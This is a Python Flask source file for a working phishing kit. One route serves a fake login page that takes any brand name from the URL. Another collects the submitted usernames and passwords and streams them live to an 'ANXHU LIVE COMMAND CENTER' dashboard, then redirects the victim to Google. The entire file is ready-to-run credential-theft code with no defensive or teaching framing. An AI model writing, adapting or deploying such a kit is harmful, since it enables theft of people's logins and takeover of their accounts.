import os
import datetime
from flask import Flask, render_template_string, request, redirect
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# --- ADMIN DASHBOARD (Live Listener) ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>ANXHU LIVE PANEL</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        body { font-family: 'Courier New', monospace; background: #050505; color: #0f0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; border: 1px solid #1f1f1f; padding: 20px; box-shadow: 0 0 20px #ff000033; }
        h1 { color: #f00; text-align: center; text-transform: uppercase; border-bottom: 2px solid #f00; }
        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; color: #fff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #0a0a0a; }
        th, td { padding: 15px; text-align: left; border: 1px solid #222; }
        th { background: #111; color: #f00; }
        tr:nth-child(even) { background: #0f0f0f; }
        .live-tag { color: #f00; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        .new-row { background: #1a0000 !important; transition: background 2s; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ANXHU LIVE COMMAND CENTER <span class="live-tag">● LIVE</span></h1>
        
        <div class="stats">
            <div>STATUS: <span style="color:#0f0">ONLINE</span></div>
            <div>ENCRYPTION: <span style="color:#0f0">AES-256</span></div>
        </div>

        <table>
            <thead>
                <tr>
                    <th>TIMESTAMP</th>
                    <th>TARGET</th>
                    <th>USERNAME/EMAIL</th>
                    <th>PASSWORD</th>
                </tr>
            </thead>
            <tbody id="log-table">
                </tbody>
        </table>
    </div>

    <script>
        const socket = io();
        socket.on('new_data', function(msg) {
            const table = document.getElementById('log-table');
            const row = table.insertRow(0);
            row.className = "new-row";
            row.innerHTML = `
                <td>${msg.time}</td>
                <td><b style="color:#fff">${msg.site}</b></td>
                <td style="color:#0f0">${msg.user}</td>
                <td style="color:#f00">${msg.pw}</td>
            `;
            // Remove highlight effect after 3 seconds
            setTimeout(() => { row.classList.remove("new-row"); }, 3000);
        });
    </script>
</body>
</html>
"""

# --- PHISHING PAGE TEMPLATE ---
PHISH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ name }} - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background: #111; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #222; padding: 30px; border-radius: 10px; width: 320px; border: 1px solid #444; text-align: center; box-shadow: 0 0 15px #f00; }
        h2 { color: #f00; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #333; border: 1px solid #555; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #f00; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>{{ name }}</h2>
        <form action="/capture" method="post">
            <input type="hidden" name="site" value="{{ name }}">
            <input type="text" name="u" placeholder="Email or Username" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">LOG IN</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/admin')
def admin():
    return render_template_string(DASHBOARD_HTML)

@app.route('/view')
def view_phish():
    site_name = request.args.get('name', 'Login')
    return render_template_string(PHISH_HTML, name=site_name)

@app.route('/capture', methods=['POST'])
def capture():
    site = request.form.get('site')
    user = request.form.get('u')
    pw = request.form.get('p')
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    
    # EMIT DATA TO ADMIN PANEL LIVE
    socketio.emit('new_data', {'site': site, 'user': user, 'pw': pw, 'time': timestamp})
    
    return redirect("https://www.google.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
